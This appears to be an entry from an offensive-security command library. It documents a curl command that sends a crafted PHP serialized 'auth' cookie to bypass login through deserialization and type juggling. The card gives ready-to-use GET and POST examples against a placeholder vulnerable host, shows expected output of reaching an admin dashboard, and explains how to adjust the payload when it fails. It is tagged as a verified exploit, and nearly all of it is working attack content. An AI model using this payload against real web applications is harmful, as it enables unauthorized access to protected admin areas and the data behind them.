---
id: 89f9e5da-702e-47ee-bf89-9f63d76ba1ca
name: curl-send-php-serialized-cookie
type: command
executor: bash
data: 'curl -X GET "$_TARGET_URL" -H "Cookie: auth=$_SERIALIZED_PAYLOAD" -v'
output: null
created_at: '2023-04-06T03:55:59.332952+00:00'
updated_at: '2023-04-06T03:55:59.339597+00:00'
platforms:
  - Linux
  - macOS
tags:
  - web
  - exploit
verified: true
validated: true
---

# curl-send-php-serialized-cookie

## Command

```bash
curl -X GET "$_TARGET_URL" -H "Cookie: auth=$_SERIALIZED_PAYLOAD" -v
```

## Description

This command uses curl to send an HTTP request to a PHP web application with a custom 'auth' cookie containing a serialized payload for deserialization-based authentication bypass. It targets protected endpoints to test if the type juggling exploit grants access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The URL of the protected page (e.g., http://target.com/admin.php) | Yes |
| $_SERIALIZED_PAYLOAD | The base64-encoded or raw serialized string (e.g., a:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}) | Yes |
| -X GET | Specifies the HTTP method (change to POST if needed) | No |
| -H "Cookie: ..." | Sets the custom cookie header | Yes |
| -v | Verbose mode to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://vulnerable-app.com/login.php" -H "Cookie: auth=a:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}" -v
```

### Advanced Usage (with POST data)

```bash
curl -X POST "http://vulnerable-app.com/admin.php" -H "Cookie: auth=a:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}" -d "action=users" -v
```

## Expected Output

Successful response (HTTP 200) with protected content:

```
* Connected to vulnerable-app.com (192.168.1.100) port 80
> GET /admin.php HTTP/1.1
> Cookie: auth=a:2:{s:8:"username";b:1;s:8:"password";b:1;}
< HTTP/1.1 200 OK
< Set-Cookie: session=abc123

<html><body>Admin Dashboard: Welcome, admin!</body></html>
```

Failure (redirect or 403) indicates the payload didn't match expected values; adjust serialization for exact username/password lengths.

## Related

- [[procedures/Authentication-Bypass-via-PHP-Deserialization-and-Type-Juggling]]
- [[codes/PHP-Auth-Bypass-Serialized-Payload]]
